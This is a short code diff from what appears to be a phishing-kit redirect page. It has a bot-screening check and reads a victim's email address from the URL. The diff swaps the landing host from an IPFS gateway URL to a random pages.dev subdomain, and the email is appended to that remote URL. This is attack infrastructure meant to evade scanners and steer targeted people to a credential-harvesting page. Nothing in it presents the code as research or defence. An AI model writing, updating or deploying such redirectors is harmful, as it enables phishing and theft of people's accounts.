@@ -216,7 +216,7 @@ async function strongBotCheck() {
     return score >= 60;
 }
 
-const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev/";
 function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
 function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
 function createBlobHTML(url) {
@@ -276,3 +276,4 @@ document.addEventListener("DOMContentLoaded", async () => {
 
 </body>
 </html>
+
